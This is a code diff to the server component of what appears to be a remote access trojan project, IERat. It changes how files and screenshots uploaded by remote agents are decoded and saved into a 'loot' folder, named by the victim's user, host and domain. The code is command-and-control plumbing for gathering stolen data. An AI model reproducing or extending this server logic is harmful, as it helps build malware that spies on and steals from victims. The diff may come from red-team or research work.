@@ -1,11 +1,6 @@
-﻿using IERat.lib;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.IO;
 using System.IO.Compression;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace IERatServer.lib
 {
@@ -15,30 +10,37 @@ namespace IERatServer.lib
         {
             try
             {
+                AgentChannel ActiveChannel = Db.GetChannelFromID(requestobject.AgentID);
+                var agent = ActiveChannel.agent;
                 if (taskObject.Type == "download")
                 {
-                    var destinationFile = File.Create(taskObject.args);
-                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
-                    destinationFile.Write(fileBytes);
-
-                    Console.WriteLine($"\nDownload successfull [{taskObject.Type} {taskObject.args}]\n");
-                    Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.Type} {taskObject.args}]");
-                    taskObject.Result = $"Successfully downloaded {destinationFile}";
-                }
-                if (taskObject.Type == "screenshot")
-                {
-                    AgentChannel ActiveChannel = Db.GetChannelFromID(requestobject.AgentID);
-                    var agent = ActiveChannel.agent;
-                    var filepath = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
+                    var Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-{taskObject.args}";
+                    var filepath = Path.Combine(CLI.LootFolder, Filename);
                     var destinationFile = File.Create(filepath);
                     var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
                     destinationFile.Write(fileBytes);
 
-                    Console.WriteLine($"Screenshot saved successfully to {filepath}\n");
+                    Console.WriteLine($"\nDownload was successfull to [{filepath}]\n");
+                    Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.args}]");
+                    taskObject.Result = $"Successfully downloaded to {filepath}";
+                }
+                if (taskObject.Type == "screenshot")
+                {
+                    var Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
+                    var filepath = Path.Combine(CLI.LootFolder, Filename);
+                    var destinationFile = File.Create(filepath);
+                    var fileBytes = Decompress(Convert.FromBase64String(taskObject.Result));
+                    destinationFile.Write(fileBytes);
+
+                    Console.WriteLine($"\nScreenshot saved successfully to {filepath}\n");
                     Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                     taskObject.Result = "Screenshot saved successfully";
                 }
-                Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestobject.AgentID, task = taskObject });
+
+                Db.TaskHistory.Add(new TaskHistoryObject() {
+                    AgentNumber = ActiveChannel.InteractNum,
+                    AgentID = requestobject.AgentID,
+                    task = taskObject });
 
             }
             catch (Exception ex)
@@ -48,7 +50,7 @@ namespace IERatServer.lib
             }
         }
 
-        static byte[] Compress(byte[] data)
+        public static byte[] Compress(byte[] data)
         {
             using var compressedStream = new MemoryStream();
             using var zipStream = new GZipStream(compressedStream, CompressionMode.Compress);
